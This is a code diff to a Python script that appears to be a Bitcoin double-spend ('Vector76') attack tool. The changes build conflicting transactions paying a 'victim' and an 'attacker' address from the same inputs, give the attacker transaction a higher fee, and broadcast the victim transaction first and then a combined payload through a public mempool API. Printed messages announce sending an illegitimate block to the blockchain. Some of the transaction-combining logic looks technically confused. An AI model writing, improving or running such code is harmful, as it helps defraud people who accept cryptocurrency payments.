@@ -77,6 +77,20 @@ def broadcast_transaction(raw_tx, testnet):
     else:
         print(f"Failed to broadcast transaction. Status code: {response.status_code}")
 
+def broadcast_mempool_space(raw_tx, testnet):
+    url = "https://mempool.space/api/tx"
+    payload = raw_tx
+    headers = {'Content-Type': 'text/plain'}
+    if testnet:
+        url = "https://mempool.space/testnet/api/tx"
+    
+    response = requests.post(url, data=payload, headers=headers)
+    print(response.text)
+    if response.status_code == 200:
+        print("Transaction successfully broadcasted!")
+    else:
+        print(f"Failed to broadcast transaction. Status code: {response.status_code}")
+
 args = parser.parse_args()
 fake_send_from   = args.from_wifkey
 victim_address   = args.send_to
@@ -128,18 +142,18 @@ send_amount = to_satoshi(amount_btc)
 tx_victim   = [{"address": victim_address, "value": send_amount}]
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
 
+tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee + 2500)
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
-tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 
-tx_victim   = transaction_util.signall(tx_victim, fake_send_from)
-tx_attacker = transaction_util.signall(tx_attacker, fake_send_from)
+tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
+tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
 #tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_victim   = cryptos.serialize(tx_victim)
 tx_attacker = cryptos.serialize(tx_attacker)
+block = f"{tx_attacker}{tx_victim}"
 
-block = f"{tx_victim}{tx_attacker}"
-vector76 = transaction_util.signall(block, fake_send_from)
-vector76 = cryptos.serialize(vector76)
+block = transaction_util.signall(block, fake_send_from)
+block = cryptos.serialize(block)
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
@@ -152,7 +166,8 @@ print(f"Send to                           : {victim_address}")
 print(f"Send Coin Amount  (Satoshi unit)  : {send_amount} Satoshi")
 print(f"Send Fee Amount   (Satoshi unit)  : {fee} Satoshi")
 print(f"Victim transaction                : {tx_victim}")
-print(f"Vector76 transaction              : {tx_attacker}")
+print(f"Attacker transaction              : {tx_attacker}")
+print(f"V                                 : {block}")
 print(f"Testnet Mode                      : {testnet}")
 print("--------------------")
 print()
@@ -164,15 +179,17 @@ print()
 input("--- Are you sure you want to continue? Press Enter to continue. ---")
 print("Sending victim Transaction ...")
 
+broadcast_transaction(tx_victim, testnet)
+input("--- Send the second transaction after pressing the enter key. --- ")
 print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
 print()
-time.sleep(2)
+time.sleep(1)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
-print(txid)
-input("--- Send the second transaction after pressing the enter key. --- ")
-broadcast_transaction(tx_attacker, testnet)
+time.sleep(1)
 print()
+#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)#broadcast_transaction(tx_attacker, testnet)
+broadcast_mempool_space(block, testnet)
+#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=fee)
 print()
 #print()
 #node.call("submitblock", data)
